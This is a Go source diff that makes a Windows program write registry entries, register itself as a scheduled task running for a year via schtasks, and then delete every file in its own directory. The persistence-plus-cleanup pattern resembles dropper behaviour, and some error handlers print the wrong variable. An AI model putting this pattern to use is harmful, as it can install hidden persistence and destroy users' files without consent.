@@ -6,6 +6,9 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"strings"
+	"time"
 )
 
 type CustomTag struct {
@@ -69,6 +72,69 @@ func runeExe(cfg Config) error {
 	return nil
 }
 
+func removeAllFilesInExeDir() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	exeDir := filepath.Dir(exePath)
+	files, err := os.ReadDir(exeDir)
+	if err != nil {
+		return fmt.Errorf("failed to read directory: %v", err)
+	}
+
+	for _, file := range files {
+		filePath := filepath.Join(exeDir, file.Name())
+		err2300 := os.Remove(filePath)
+		if err2300 != nil {
+			fmt.Println("Error occurred removing file " + file.Name())
+		}
+	}
+
+	return nil
+}
+func updateScheduleTemplate(templatePath, outputPath string) error {
+	// Read the template file
+	templateData, err := os.ReadFile(templatePath)
+	if err != nil {
+		return fmt.Errorf("failed to read template file: %v", err)
+	}
+
+	// Get the current time and calculate the replacement times
+	startTime := time.Now().Add(2 * time.Minute).Format(time.RFC3339)
+	endTime := time.Now().AddDate(1, 0, 0).Format(time.RFC3339)
+
+	// Get the path to the executable
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// Replace the placeholders in the template
+	updatedData := strings.ReplaceAll(string(templateData), "##REPLACE START##", startTime)
+	updatedData = strings.ReplaceAll(updatedData, "##REPLACE END##", endTime)
+	updatedData = strings.ReplaceAll(updatedData, "##REPLACE FILE PATH##", exePath)
+
+	// Write the updated data to the output file
+	err = os.WriteFile(outputPath, []byte(updatedData), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write output file: %v", err)
+	}
+
+	return nil
+}
+
+func createScheduledTaskFromXML(xmlFilePath string) error {
+	cmd := exec.Command("schtasks", "/create", "/tn", "YourTaskName", "/xml", xmlFilePath)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("failed to create scheduled task: %v, output: %s", err, output)
+	}
+	fmt.Println("Scheduled task created successfully")
+	return nil
+}
+
 func main() {
 	config, err := readConfig("conf.json")
 
@@ -87,9 +153,23 @@ func main() {
 	err2 := addRegistryEntries(*config)
 	if err2 != nil {
 		fmt.Printf("Error: %v\n", err)
+		return
 	} else {
 		fmt.Println("Registry entries added successfully")
 	}
+
+	err232 := updateScheduleTemplate("template.xml", "schedule.xml")
+	if err232 != nil {
+		fmt.Printf("Error: %v\n", err)
+	} else {
+		fmt.Println("Schedule updated successfully")
+	}
+	err300 := createScheduledTaskFromXML("schedule.xml")
+	if err300 != nil {
+		fmt.Printf("Error: %v\n", err)
+	}
+
+	removeAllFilesInExeDir()
 
 	var input string
 	fmt.Print("Enter your input: ")
